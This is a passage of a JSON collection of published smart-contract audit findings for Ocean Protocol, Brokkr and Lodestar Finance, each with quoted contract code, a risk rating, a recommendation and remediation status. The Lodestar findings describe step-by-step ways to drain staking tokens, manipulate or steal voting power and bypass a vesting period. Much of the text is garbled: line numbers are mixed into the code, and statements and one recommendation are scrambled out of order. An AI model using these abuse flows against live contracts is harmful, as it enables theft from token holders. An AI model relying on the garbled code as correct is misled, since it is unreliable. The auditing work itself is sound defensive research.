        "body": "In the ERC721Factory.sol, SideStaking.sol, BFactory.sol and FactoryRouter .sol contract, there are instances where external methods are called, and the return values are not stored in a local or state variable. Code Location: ERC721Factory Listing 34: ERC721Factory.sol (Line 484) 479 require ( IERC20Template ( publishMarketFeeToken ).  transferFrom ( 480 481 482 483 484 msg . sender , address ( this ) , publishMarketFeeAmount ) , ' Failed to transfer publishFee '); IERC20Template ( publishMarketFeeToken ). approve (  orders [i ]. tokenAddress , publishMarketFeeAmount ); 485 } ERC721Factory Listing 35: ERC721Factory.sol (Line 494) 489 require ( IERC20Template ( orders [ i ]. consumeFeeToken ).  transferFrom ( 490 491 492 493 494 msg . sender , address ( this ) , orders [i ]. consumeFeeAmount ) , ' Failed to transfer consumeFee '); IERC20Template ( orders [i ]. consumeFeeToken ). approve (  orders [i ]. tokenAddress , orders [ i ]. consumeFeeAmount ); 495 } 59 ERC721Factory Listing 36: ERC721Factory.sol (Line 598) 597 598 // allow router to take the liquidity IERC20Template ( _PoolData . addresses [1]) . approve ( router ,  _PoolData . ssParams [4]) ; 599 600 601 602 603 604 poolAddress = IERC20Template ( erc20Address ). deployPool ( _PoolData . ssParams , _PoolData . swapFees , _PoolData . addresses ); FactoryRouter Listing 37: FactoryRouter.sol (Lines 273,292,294,295,296,297,298,299 ,316,321) 262 263 264 265 266 267 268 269 function buyDTBatch ( Operations [] calldata _operations ) external { for ( uint i = 0; i < _operations . length ; i ++) { if ( _operations [ i ]. operation == operationType .  SwapExactIn ) { 270 271 // Get amountIn from user to router IERC20 ( _operations [ i ]. tokenIn ). transferFrom (  msg . sender , address ( this ) , _operations [ i ]. amountsIn ); 272 273 // we approve pool to pull token from router IERC20 ( _operations [ i ]. tokenIn ). approve (  _operations [ i ]. source , _operations [ i ]. amountsIn ); 274 275 276 277 278 279 280 281 282 // Perform swap ( uint amountReceived ,) = IPool ( _operations [i ]. source ) . swapExactAmountIn ( _operations [ i ]. tokenIn , _operations [ i ]. amountsIn , _operations [ i ]. tokenOut , _operations [ i ]. amountsOut , _operations [ i ]. maxPrice ); // transfer token swapped to user 60 283 284 require ( IERC20 ( _operations [i ]. tokenOut ).  transfer ( msg . sender , amountReceived ) , ' Failed MultiSwap '); 285 } else if ( _operations [ i ]. operation ==  operationType . SwapExactOut ){ 286  exact Out 287 288 // calculate how much amount In we need for uint amountIn = IPool ( _operations [ i ]. source ) . getAmountInExactOut ( _operations [ i ]. tokenIn ,  _operations [ i ]. tokenOut , _operations [i ]. amountsOut ); 289 290 // pull amount In from user IERC20 ( _operations [ i ]. tokenIn ). transferFrom (  msg . sender , address ( this ) , amountIn ); 291 292 // we approve pool to pull token from router IERC20 ( _operations [ i ]. tokenIn ). approve (  _operations [ i ]. source , amountIn ); 293 294 295 296 297 298 299 300 301 302 // perform swap IPool ( _operations [i ]. source ) . swapExactAmountOut ( _operations [i ]. tokenIn , _operations [ i ]. amountsIn , _operations [ i ]. tokenOut , _operations [ i ]. amountsOut , _operations [ i ]. maxPrice ); // send amount out back to user require ( IERC20 ( _operations [i ]. tokenOut ) . transfer ( msg . sender , _operations [ i ]. amountsOut  ) , ' Failed MultiSwap '); 303 304 } else if ( _operations [ i ]. operation ==  operationType . FixedRate ) { 305 306 307 // get datatoken address (, address datatoken , , , , , , , , , ,) = IFixedRateExchange ( _operations [ i ]. source ).  getExchange ( _operations [i ]. exchangeIds ); 308 309 310 311 // get tokenIn amount required for dt out ( uint baseTokenAmount , , ,) = IFixedRateExchange ( _operations [ i ]. source ). calcBaseInGivenOutDT ( _operations [ i ].  exchangeIds , _operations [i ]. amountsOut ); 312 313 314 // pull tokenIn amount IERC20 ( _operations [ i ]. tokenIn ). transferFrom (  msg . sender , address ( this ) , baseTokenAmount ); 315 // we approve pool to pull token from router 61 316 IERC20 ( _operations [ i ]. tokenIn ). approve (  _operations [ i ]. source , baseTokenAmount ); 317 318 319 // perform swap IFixedRateExchange ( _operations [ i ]. source ) . buyDT ( _operations [ i ]. exchangeIds , _operations [  i ]. amountsOut , _operations [ i ]. amountsIn ); 320 321 // send dt out to user IERC20 ( datatoken ). transfer ( msg . sender ,  _operations [ i ]. amountsOut ); 322 323 324 325 } else { IDispenser ( _operations [ i ]. source ) . dispense ( _operations [ i ]. tokenOut , _operations [  i ]. amountsOut , msg . sender ); } } 326 327 328 329 330 } SideStaking Listing 38: SideStaking.sol (Line 258) 245 246 247 248 249 250 251 252 function Stake ( address datatokenAddress , address stakeToken , uint256 amount ) public { if ( _datatokens [ datatokenAddress ]. bound != true ) return ; require ( msg . sender == _datatokens [ datatokenAddress ].  poolAddress , 253 254 255 256 257 258 \" ERR : Only pool can call this \" ); bool ok = canStake ( datatokenAddress , stakeToken , amount ); if ( ok != true ) return ; IERC20Template dt = IERC20Template ( datatokenAddress ); dt . approve ( _datatokens [ datatokenAddress ]. poolAddress ,  amount ); 259 260 } _datatokens [ datatokenAddress ]. datatokenBalance -= amount ; 62 SideStaking Listing 39: SideStaking.sol (Lines 322,326,327,328,329) 320 321 322 // approve the tokens and amounts IERC20Template dt = IERC20Template ( datatokenAddress ); dt . approve ( _datatokens [ datatokenAddress ]. poolAddress ,  dataTokenAmount ); IERC20Template dtBase = IERC20Template ( _datatokens [ datatokenAddress ]. basetokenAddress ); dtBase . approve ( _datatokens [ datatokenAddress ]. poolAddress , baseTokenAmount ); 323 324 325 326 327 328 329 BFactory Listing 40: BFactory.sol (Lines 117,118,119,120,121,122) 116 117 118 119 120 121 122 123 124 // requires approval first from basetokenSender ISideStaking ( addresses [0]) . newDataTokenCreated ( tokens [0] , tokens [1] , bpool , addresses [3] , // publisherAddress ssParams ); return bpool ; Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to add return values check to avoid unexpected contract crashes. This can be implemented with a require statement and will help handle exceptions more comprehensively. 63 Remediation Plan: PARTIALLY SOLVED: The Ocean Protocol team amended certain functionalities to include return value checking; however, the following functions were called without checking the return value:  newDataTokenCreated: BFactory contract  swapExactAmountOut function called within the buyDTBatch function : FactoryRouter contract 64 ",
        "labels": [
            "Halborn",
            "Ocean_Protocol",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ZERO",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Ocean_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "For There are several instances where address validation is missing. instance, zero address validation failure has been found when assigning user-supplied address values to state variables directly. The following list shows all the instances where zero address check failure was identified:  ERC721Factory.sol: variable _router  FactoryRouter.sol: variables _routerOwner, _opfCollector within the constructor, and variable _factory within function addFactory  ERC20Template.sol, variables within _publishMarketFeeAddress and setPublishingMarketFee; _publishMarketFeeToken variable _newFeeCollector within function setFeeCollector  SideStaking.sol, variable _router within the constructor  BPool.sol variable _newCollector within updateMarketFeeCollector function Code Location: ERC721Factory Listing 41: ERC721Factory.sol (Lines 83,93) 79 80 81 82 83 84 85 86 87 88 constructor ( address _template721 , address _template , address _collector , address _router ) { require ( _template != address (0) && _collector != address (0) && _template721 != address (0) , 65 \" ERC721DTFactory : Invalid template token / community fee 89  collector address \" ); 90 add721TokenTemplate ( _template721 ); 91 addTokenTemplate ( _template ); 92 router = _router ; 93 94 communityFeeCollector = _collector ; 95 } FactoryRouter Listing 42: FactoryRouter.sol (Lines 41,42) constructor ( 34 35 36 37 38 39 40  _preCreatedPools ) { 41 42 43 44 } address _routerOwner , address _oceanToken , address _bpoolTemplate , address _opfCollector , address [] memory _preCreatedPools routerOwner = _routerOwner ; opfCollector = _opfCollector ; oceanTokens [ _oceanToken ] = true ; ) public BFactory ( _bpoolTemplate , _opfCollector , FactoryRouter Listing 43: FactoryRouter.sol (Line 68) 66  { 67 68 69 function addFactory ( address _factory ) external onlyRouterOwner require ( factory == address (0) , \" FACTORY ALREADY SET \" ); factory = _factory ; } ERC20Template.sol 66 Listing 44: ERC20Template.sol (Lines 555,556,558,559) 554 555 556 557 function setPublishingMarketFee ( address _publishMarketFeeAddress , address _publishMarketFeeToken , uint256 _publishMarketFeeAmount ) external  onlyPublishingMarketFeeAddress { 558 559 560 561 } publishMarketFeeAddress = _publishMarketFeeAddress ; publishMarketFeeToken = publishMarketFeeAmount = _publishMarketFeeAmount ; _publishMarketFeeToken ; ERC20Template.sol Listing 45: ERC20Template.sol (Lines 527,532) 527 528 529 530 531 532 533 function setFeeCollector ( address _newFeeCollector ) external { require ( permissions [ msg . sender ]. feeManager == true , \" ERC20Template : NOT FEE MANAGER \" ); feeCollector = _newFeeCollector ; } SideStaking.sol Listing 46: SideStaking.sol (Line 61) 60 61 62 constructor ( address _router ) public { router = _router ; } Listing 47: BPool.sol (Line 274) 272 function updateMarketFeeCollector ( address _newCollector )  external { 273 require ( _marketCollector == msg . sender , \" ONLY MARKET  COLLECTOR \"); 274 275 } _marketCollector = _newCollector ; 67 Risk Level: Likelihood - 2 Impact - 3 Recommendation: Although administrative restrictions are imposed on this function due to the role-based access controls (RBAC) it is recommended to add proper address validation when assigning user supplied input to a variable. This could be as simple as using the following statement: Listing 48 1 require ( address_input != 0 , \" Address is zero \" ) Remediation Plan: SOLVED: The Ocean Protocol team implemented the recommended fix to ensure addresses are not equal to zero. 68 ",
        "labels": [
            "Halborn",
            "Ocean_Protocol",
            "Severity: Low"
        ]
    },
    {
        "title": "DIVIDE BEFORE MULTIPLY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Ocean_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "As a result, loss of Soliditys integer division could be truncated. precision can sometimes be avoided by multiplying before dividing, al- though the manual implementation of the precision/decimal calculation is taken care of by the developer. In the smart contracts set, there are multiple instances where division is performed before multiplication. Code Location: FixedRateExchange Listing 49: FixedRateExchange.sol (Lines 259,260,261,262,263,268,269 ,270,273,274,275) 248 function calcBaseInGivenOutDT ( bytes32 exchangeId , uint256  dataTokenAmount ) 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 public view onlyActiveExchange ( exchangeId ) returns ( uint256 baseTokenAmount , uint256 baseTokenAmountBeforeFee , uint256 oceanFeeAmount , uint256 marketFeeAmount ) { baseTokenAmountBeforeFee = dataTokenAmount . mul ( exchanges [ exchangeId ]. fixedRate ) . div ( BASE ) . mul (10** exchanges [ exchangeId ]. btDecimals ) . div (10** exchanges [ exchangeId ]. dtDecimals ); oceanFeeAmount ; if ( getOPFFee ( exchanges [ exchangeId ]. baseToken ) != 0) { oceanFeeAmount = baseTokenAmountBeforeFee 69 269 270 271 272 273 274 275 276 277 278 . mul ( getOPFFee ( exchanges [ exchangeId ]. baseToken )) . div ( BASE ); } marketFeeAmount = baseTokenAmountBeforeFee . mul ( exchanges [ exchangeId ]. marketFee ) . div ( BASE ); baseTokenAmount = baseTokenAmountBeforeFee . add (  marketFeeAmount ). add ( oceanFeeAmount 279 280 281 282 ); } FixedRateExchange Listing 50: FixedRateExchange.sol (Lines 301,302,303,304,305,310,311 ,312,315,316,317) 290 function calcBaseOutGivenInDT ( bytes32 exchangeId , uint256  dataTokenAmount ) 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 public view onlyActiveExchange ( exchangeId ) returns ( uint256 baseTokenAmount , uint256 baseTokenAmountBeforeFee , uint256 oceanFeeAmount , uint256 marketFeeAmount ) { baseTokenAmountBeforeFee = dataTokenAmount . mul ( exchanges [ exchangeId ]. fixedRate ) . div ( BASE ) . mul (10** exchanges [ exchangeId ]. btDecimals ) . div (10** exchanges [ exchangeId ]. dtDecimals ); oceanFeeAmount ; if ( getOPFFee ( exchanges [ exchangeId ]. baseToken ) != 0) { oceanFeeAmount = baseTokenAmountBeforeFee 70 311 312 313 314 315 316 317 318 319 320 . mul ( getOPFFee ( exchanges [ exchangeId ]. baseToken )) . div ( BASE ); } marketFeeAmount = baseTokenAmountBeforeFee . mul ( exchanges [ exchangeId ]. marketFee ) . div ( BASE ); baseTokenAmount = baseTokenAmountBeforeFee . sub (  marketFeeAmount ). sub ( oceanFeeAmount 321 322 323 324 ); } SideStaking Listing 51: SideStaking.sol (Lines 314,315,316,317,318) uint256 baseTokenAmount = _datatokens [ datatokenAddress ] . basetokenBalance ; // given the price , compute dataTokenAmount uint256 dataTokenAmount = (( _datatokens [ datatokenAddress ]. baseTokenAmount * dataTokenWeight ) / baseTokenWeight / BASE ) * (10**(18 - decimals )) ; 310 311 312 313 314  rate * 315 316 317 318 319 SideStaking Listing 52: SideStaking.sol (Lines 378,379,380,381,383) 375 376 377 378 _datatokens [ datatokenAddress ]. vestingLastBlock ; } uint256 vestPerBlock = _datatokens [ datatokenAddress ].  vestingAmount . div ( 379 _datatokens [ datatokenAddress ]. vestingEndBlock - 71 380 381 382 383 384 385 _datatokens [ datatokenAddress ]. blockDeployed ); if ( vestPerBlock == 0) return ; uint256 amount = blocksPassed . mul ( vestPerBlock ); if ( amount > 0 && Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider performing multiplications before divisions to ensure precision in results when using non-floating-point data types. Remediation Plan: SOLVED: The Ocean Protocol team amended smart contracts to perform mul- tiplication operations before division. 72 3.10 (HAL-10) USE OF BLOCK-TIMESTAMP - LOW ",
        "labels": [
            "Halborn",
            "Ocean_Protocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "PRIVILEGED ADDRESS CAN BE TRANSFERRED WITHOUT CONFIRMATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P2_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Incorrect use of the update_config function in contracts can set owner to have an invalid address and inadvertently lose control of the contracts, which cannot be undone in any way. Currently, the contract owner can change the owner address using the aforementioned function in a single transaction and without confirmation from the new address. The affected smart contracts are the following:  epoch-manager  distributor-v1 Code Location: Listing 1: contracts/distributor-v1/src/commands.rs (Lines 23-26) 21 let mut config = load_config ( deps . storage ) ?; 22 23 if let Some ( owner ) = owner { 24 25 } config . owner = deps . api . addr_canonicalize (& owner ) ?; Listing 2: contracts/bbro-minter/src/commands.rs (Lines 28-30) 26 let mut config = load_config ( deps . storage ) ?; 27 28 if let Some ( owner ) = owner { 29 30 } config . owner = deps . api . addr_canonicalize (& owner ) ?; 13 Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to split the owner transfer functionality into the set_owner and accept_ownership functions. This last function allows the recipient to complete the transfer. Remediation plan: SOLVED: The issue was fixed in commit 79549c38936e99a89a1fa7aa7e38456032f47389. 14 ",
        "labels": [
            "Halborn",
            "Brokkr_Protocol_P2_Contracts_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "UNCHECKED ARITHMETICAL OPERATIONS CAN CAUSE PANIC",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P2_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When calculating the distribution of rewards, the distributor-v1 contract performs a division without checking that the denominator is not zero. In the event that epoch_manager is misconfigured and has an epoch length of 0 blocks (that can happen because the epoch manager does not check for that condition), the distribute function would panic, leaving the user without a precise error message for your failed transaction. Code Location: Listing 3: contracts/distributor-v1/src/commands.rs, (Line 44) & deps . querier , deps . api . addr_humanize (& config . epoch_manager_contract )? , 35 // query epoch from epoch_manager contract 36 let epoch_blocks = query_epoch_info ( 37 38 39 )? 40 . epoch ; 41 42 // distribute rewards only for passed epochs 43 let blocks_since_last_distribution = env . block . height - state .  last_distribution_block ; 44 let passed_epochs = blocks_since_last_distribution / epoch_blocks ; 45 if passed_epochs == 0 { 46 47 } return Err ( ContractError :: NoRewards {}) ; Risk Level: Likelihood - 1 Impact - 1 15 Recommendation: When performing arithmetic operations, it is recommended that you use For example, the line of code could be replaced checked arithmetic. with: blocks_since_last_distribution.checked_div(epoch_blocks). Remediation plan: ACKNOWLEDGED: The Brokkr team acknowledged this finding. They also stated that since epoch_blocks is a primitive type, there is no need to convert it to a wrapped as that would break the whole protocol. 16 ",
        "labels": [
            "Halborn",
            "Brokkr_Protocol_P2_Contracts_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "ESLODE TOKENS CAN BE DRAINED BY CALLING WITHDRAWESLODE(",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The StakingRewards contract implements the function withdrawEsLODE() that allows users to unstake their esLODE without converting them to LODE: Listing 1: StakingRewards.sol (Line 347) 338 /* * 339 340 * @notice Withdraw esLODE * @dev can only be called by the end user when withdrawing of  esLODE is allowed */ 341 342 function withdrawEsLODE () external nonReentrant { 343 require ( withdrawEsLODEAllowed == true , \" esLODE Withdrawals Not  Permitted \" ); 344 345 346 347 348 349 } // harvest () ; StakingInfo storage account = stakers [ msg . sender ]; uint256 totalEsLODE = account . totalEsLODEStakedByUser ; esLODE . safeTransfer ( msg . sender , totalEsLODE ); emit UnstakedEsLODE ( msg . sender , totalEsLODE ); Although, this function does not update the storage after withdrawing, allowing any user to repeatedly call this function, draining all the esLODE from the contract. Proof of Concept: The proof of concept shows how the user1 is able to repeatedly call the withdrawEsLODE() function, draining all the esLODE from the contract. 25 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:C/Y:N/R:N/S:U (10) Recommendation: It is recommended to reset the stakers[msg.sender].totalEsLODEStakedByUser storage to 0 after the withdrawEsLODE() call. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : aba53cfd19189720cb8c32368176648d6aead960. 26 ",
        "labels": [
            "Halborn",
            "Lodestar_Finance_Staking",
            "Severity: Critical"
        ]
    },
    {
        "title": "VOTING POWER CAN BE MANIPULATED BY STAKING, VOTING, UNSTAKING 10 SECONDS LATER AND TRANSFERRING LODE TO A NEW WALLET",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The VotingPower contract calculates the users voting power through the StakingRewards.accountVoteShare() function: Listing 2: StakingRewards.sol 694 /* * 695 * @notice Function used to calculate a user 's voting power for  emissions voting 696 697 * @param account The staker 's address * @return Returns the user 's voting power as a percentage of the  total voting power */ 698 699 function accountVoteShare ( address account ) public view returns (  uint256 ) { 700 701 702 703 704 705 706 uint256 stLODEStaked = stakers [ account ]. stLODEAmount ; uint256 vstLODEStaked = stakers [ account ]. relockStLODEAmount ; uint256 totalStLODEStaked = totalSupply () - totalRelockStLODE ; uint256 totalVstLODEStaked = totalRelockStLODE ; uint256 totalStakedAmount = stLODEStaked + vstLODEStaked ; uint256 totalStakedBalance = totalStLODEStaked +  totalVstLODEStaked ; 707 708 709 710 711 if ( totalStakedBalance == 0) { return 0; } 27 712 713 } return ( totalStakedAmount * 1 e18 ) / totalStakedBalance ; As soon as LODE is staked in the StakingRewards contract, the voting power is increased. Although, the minimum period of time that LODE can be staked is just 10 seconds. Hence, any user could: 1. Stake LODE for 10 seconds. 2. Vote with their increased voting power. 3. Wait 10 seconds, unstake, transfer the LODE tokens to another wallet. 4. Stake LODE using the new wallet. 5. Vote again. 6. Repeat. 28 This way, the votes can be easily manipulated. BVSS: AO:A/AC:L/AX:L/C:N/I:C/A:N/D:N/Y:N/R:N/S:C (10) Recommendation: It is recommended to set the minimum stake period to one week or simply do not assign any voting power to users which lockTime is set only to 10 seconds. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : aba53cfd19189720cb8c32368176648d6aead960. 29 ",
        "labels": [
            "Halborn",
            "Lodestar_Finance_Staking",
            "Severity: Critical"
        ]
    },
    {
        "title": "VOTING POWER CAN BE STOLEN BY CALLING VOTINGPOWER.DELEGATE FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The VotingPower contract contains the function delegate() which supposedly is used to delegate voting power to another address of the users choice: Listing 3: VotingPower.sol 95 // / @notice Delegates existing voting power to an address of the  user 's choice . 96 // / @param to The address in which the user wishes to delegate  their voting power to . 97 function delegate ( address to ) external resetVotesIfNeeded  whenNotPaused { 98 99 100 } voteDelegates [ msg . sender ] = to ; emit DelegateChanged ( msg . sender , to ); Moreover, VotingPower.vote() function to calculate the voting power: voteDelegates incorrectly mapping this is used in the Listing 4: VotingPower.sol (Line 146) string [] calldata tokens , OperationType [] calldata operations , uint256 [] calldata shares 128 function vote ( 129 130 131 132 ) external resetVotesIfNeeded whenNotPaused { 133 134 require ( tokens . length == operations . length && tokens . length == 30  shares . length , 135 136 137 138 139 140 \" Arrays must have the same length \" ); uint256 currentWeek = getCurrentWeek () ; require ( // Will pass if lastVotedWeek [ msg . sender ] is less than  currentWeek (i . e., the user hasn 't voted this week ) or if  currentWeek and lastVotedWeek [ msg . sender ] are both 0 141 // ( i. e ., it 's the first week since the contract was  deployed and the user hasn 't voted before ) . 142 lastVotedWeek [ msg . sender ] < currentWeek || ( currentWeek ==  0 && lastVotedWeek [ msg . sender ] == 0 && ! previouslyVoted [ msg .  sender ]) , 143 144 145 146 \" You have already voted this week \" ); uint256 userVotingPower = stakingRewards . accountVoteShare (  voteDelegates [ msg . sender ] == address (0) ? msg . sender :  voteDelegates [ msg . sender ]) ; 147 148 149 150 151 152 153 154 155 uint256 totalShares = 0; for ( uint256 i = 0; i < tokens . length ; i ++) { string memory token = tokens [ i ]; OperationType operation = operations [ i ]; uint256 share = shares [ i ]; require ( share > 0, \" Share must be greater than 0 \" ); require ( tokenEnabled [ token ], \" Token is not enabled for  voting \"); 156 157 if (! bothOperationsAllowed [ token ]) { require ( operation == OperationType . SUPPLY , \" Only  supply emissions are allowed for this token \"); 158 159 160 161 } userVotes [ msg . sender ][ i ] = Vote ( share , token , operation ); totalVotes [ token ][ operation ] = totalVotes [ token ][ operation  ]. add ( share ); 162 163 164 165 166 167 totalShares = totalShares . add ( share ); emit VoteCast ( msg . sender , token , operation , share ); } require ( totalShares <= userVotingPower , \" Voted shares exceed 31  user 's voting power \" ); 168 169 170 } lastVotedWeek [ msg . sender ] = currentWeek ; previouslyVoted [ msg . sender ] = true ; Basically, when stakingRewards.accountVoteShare() is called, if the voteDelegates mapping is not pointing to the address(0), the voting power of the voteDelegates mapping address will be used. This flawed implementation allows anyone to vote with the voting power of another user by simply calling delegate(<high voting power address>). Proof of Concept: 32 BVSS: AO:A/AC:L/AX:L/C:N/I:C/A:N/D:N/Y:N/R:N/S:C (10) Recommendation: It is recommended to either rebuild from scratch the delegating logic or otherwise remove it. Some example implementation of voting power delegation can be found in OpenZeppelins Votes contract. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : aba53cfd19189720cb8c32368176648d6aead960. 33 ",
        "labels": [
            "Halborn",
            "Lodestar_Finance_Staking",
            "Severity: Critical"
        ]
    },
    {
        "title": "THE ONE YEAR VESTING PERIOD FOR ESLODE TOKENS CAN BE BYPASSED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the StakingRewards contract, the function convertEsLODEToLODE() is used to convert vested esLODE to LODE. The vesting period of the esLODE tokens is 365 days: Listing 5: StakingRewards.sol (Line 252) 239 /* * 240 * @notice Converts vested esLODE to LODE and updates user reward  shares accordingly accounting for current lock time and relocks * @param user The staker 's address */ 241 242 243 function convertEsLODEToLODE ( address user ) public returns ( uint256  ) { 244 // since this is also called on unstake and harvesting , we exit  out of this function if user has no esLODE staked . 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 if ( stakers [ msg . sender ]. totalEsLODEStakedByUser == 0) { return 0; } uint256 lockTime = stakers [ user ]. lockTime ; uint256 threeMonthCount = stakers [ user ]. threeMonthRelockCount ; uint256 sixMonthCount = stakers [ user ]. sixMonthRelockCount ; uint256 totalDays = 365 days ; uint256 amountToTransfer ; uint256 stLODEAdjustment ; uint256 conversionAmount ; Stake [] memory userStakes = esLODEStakes [ msg . sender ]; for ( uint256 i = 0; i < userStakes . length ; i ++) { 34 260 uint256 timeDiff = ( block . timestamp - userStakes [ i ].  startTimestamp ); 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 uint256 alreadyConverted = userStakes [ i ]. alreadyConverted ; if ( timeDiff >= totalDays ) { conversionAmount = userStakes [ i ]. amount ; amountToTransfer += conversionAmount ; userStakes [ i ]. amount = 0; if ( lockTime == 90 days ) { stLODEAdjustment += ( conversionAmount * (( stLODE3M - 1 e18 ) + ( threeMonthCount * relockStLODE3M ) + ( sixMonthCount * relockStLODE6M )) ) / BASE ; } else if ( lockTime == 180 days ) { stLODEAdjustment += ( conversionAmount * (( stLODE6M - 1 e18 ) + ( threeMonthCount * relockStLODE3M ) + ( sixMonthCount * relockStLODE6M )) ) / BASE ; } } else if ( timeDiff < totalDays ) { uint256 conversionRatioMantissa = ( timeDiff * BASE ) /  totalDays ; 284 conversionAmount = (( userStakes [i ]. amount *  conversionRatioMantissa ) / BASE ) - alreadyConverted ; 285 286 amountToTransfer += conversionAmount ; esLODEStakes [ msg . sender ][ i ]. alreadyConverted +=  conversionAmount ; 287  ; 288 289 290 291 292 293 294 295 296 297 298 esLODEStakes [ msg . sender ][ i ]. amount -= conversionAmount if ( lockTime == 90 days ) { stLODEAdjustment += ( conversionAmount * (( stLODE3M - 1 e18 ) + ( threeMonthCount * relockStLODE3M ) + ( sixMonthCount * relockStLODE6M )) ) / BASE ; } else if ( lockTime == 180 days ) { stLODEAdjustment += ( conversionAmount * (( stLODE6M - 1 e18 ) + 35 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 ( threeMonthCount * relockStLODE3M ) + ( sixMonthCount * relockStLODE6M )) ) / BASE ; } } } stakers [ user ]. lodeAmount += amountToTransfer ; stakers [ user ]. totalEsLODEStakedByUser -= amountToTransfer ; totalEsLODEStaked -= amountToTransfer ; if ( stLODEAdjustment != 0) { stakers [ user ]. stLODEAmount += stLODEAdjustment ; UserInfo storage userRewards = userInfo [ user ]; uint256 _prev = totalSupply () ; updateShares () ; unchecked { userRewards . amount += uint96 ( stLODEAdjustment ); shares += uint96 ( stLODEAdjustment ); } userRewards . wethRewardsDebt = userRewards . wethRewardsDebt + int128 ( uint128 ( _calculateRewardDebt ( accWethPerShare ,  uint96 ( stLODEAdjustment )) )) ; 326 327 328 329 330 _mint ( address ( this ) , stLODEAdjustment ); unchecked { if ( _prev + stLODEAdjustment != totalSupply () ) revert  DEPOSIT_ERROR () ; 331 332 333 334 335 336 } } } esLODE . transfer ( address (0) , amountToTransfer ); return conversionAmount ; The convertEsLODEToLODE(address user) function has a user parameter that when used with an account different from msg.sender causes the following 36 exploit: 1. User1 stakes 1000e18 esLODE and waits 365 days. User1s esLODE tokens are vested at this point. 2. User1 creates another wallet, lets call this wallet User2. 3. User2 stakes 1000e18 esLODE tokens. 4. User1 calls convertEsLODEToLODE(<user2 address>). 5. User2 esLODE tokens are converted right away to LODE 6. Repeat this process with other wallets to totally bypass the vesting period. 37 BVSS: AO:A/AC:L/AX:L/C:N/I:C/A:N/D:N/Y:N/R:N/S:C (10) Recommendation: is It recommended convertEsLODEToLODE() logic using msg.sender. Remediation Plan: remove to function the and user perform parameter all the from the function SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : aba53cfd19189720cb8c32368176648d6aead960. 38 ",
        "labels": [
            "Halborn",
            "Lodestar_Finance_Staking",
            "Severity: Critical"
        ]
    },
    {
        "title": "LODE TOKENS CAN BE PERMANENTLY STUCK IN THE STAKINGREWARDS CONTRACT DUE TO WRONG MINTING/BURNING LOGIC IN STAKE/UNSTAKE LODE FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the StakingRewards contract, VotingPower is minted every time a user calls stakeLODE() and burnt every time a user calls the unstakeLODE() function. Although, in the convertEsLODEToLODE() function, when lockTime is dif- ferent from 10 seconds, VotingPower is also burnt: Listing 6: StakingRewards.sol (Line 367) 364 // Adjust voting power if user is locking LODE 365 if ( stakers [ msg . sender ]. lockTime != 10 seconds ) { 366 // if user is unlocked , we need to burn their converted amount  of voting power 367 368 } else { votingContract . burn ( msg . sender , conversionAmount ); lockTime will be different from 10 seconds if: 1. User staked LODE with 90 or 180 days lockTime. 2. User has not staked LODE yet. Based on this implementation, the following flow would cause an overflow, not allowing users to unstake their LODE tokens: 39 1 year later, when the vesting is completed, 1. Alice stakes 100 esLODE tokens. She receives 100 VotingPower. 2. Alice calls convertEsLODEToLODE() converting those 100 esLODE tokens into 100 As she hadnt staked any LODE before, her lockTime is LODE tokens. 0, entering the if logic mentioned above. This means that her 100 VotingPower is burnt. Alice tries to unstake her 100 LODE token, but she cant as it 3. reverts with [FAIL. Reason: Burn amount exceeds voting power]. Contract is incorrectly trying to burn VotingPower that she does not have anymore, as it was already burnt before during the convertEsLODEToLODE() call. Proof of Concept: 40 BVSS: AO:A/AC:L/AX:L/C:N/I:C/A:N/D:C/Y:N/R:N/S:U (10) Recommendation: It is recommended to not mint VotingPower when users stake for 10 seconds in the stakeLODE() function. Accordingly, the VotingPower should not be burnt when users unstake with a 0 or 10 lockTime in the unstakeLODE() function. 